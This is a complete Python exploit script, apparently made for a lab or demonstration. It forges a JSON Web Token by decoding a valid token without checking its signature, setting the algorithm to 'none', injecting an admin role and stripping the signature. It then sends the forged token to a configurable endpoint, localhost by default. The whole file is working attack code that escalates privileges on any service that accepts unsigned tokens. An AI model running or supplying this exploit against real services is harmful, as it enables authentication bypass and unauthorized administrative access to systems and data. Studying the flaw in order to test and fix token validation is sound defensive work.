"""Forge a JWT with alg=none and call the vulnerable endpoint."""

from __future__ import annotations

import argparse
from typing import Any, Dict

import jwt
import requests

DEFAULT_URL = "http://localhost:8000/api/v1/admin/dashboard"


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Exploit alg=none JWT validation.")
    parser.add_argument("--token", required=True, help="A valid JWT to modify.")
    parser.add_argument("--url", default=DEFAULT_URL, help="Target API URL.")
    parser.add_argument("--role", default="admin", help="Role to inject in the token.")
    return parser.parse_args()


def decode_payload(token: str) -> Dict[str, Any]:
    """Decode the JWT payload without verifying the signature."""
    return jwt.decode(
        token,
        options={
            "verify_signature": False,
            "verify_aud": False,
            "verify_iss": False,
            "verify_exp": False,
        },
        algorithms=["none", "HS256", "RS256"],
    )


def strip_signature(token: str) -> str:
    """Remove the signature part of a JWT, leaving a trailing dot."""
    if isinstance(token, bytes):
        token = token.decode("utf-8")

    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format.")

    return f"{parts[0]}.{parts[1]}."


def forge_token(original_token: str, role: str) -> str:
    """Forge a JWT by setting alg=none and injecting a new role claim."""
    payload = decode_payload(original_token)
    payload["role"] = role

    header = jwt.get_unverified_header(original_token)
    header["alg"] = "none"

    unsigned = jwt.encode(payload, key=None, algorithm="none", headers=header)
    return strip_signature(unsigned)


def send_request(url: str, token: str) -> None:
    """Send the forged token to the vulnerable endpoint."""
    response = requests.get(
        url,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )

    print(f"Status: {response.status_code}")
    print(response.text)


def main() -> None:
    """Run the attack simulation."""
    args = parse_args()
    forged = forge_token(args.token, args.role)
    send_request(args.url, forged)


if __name__ == "__main__":
    main()
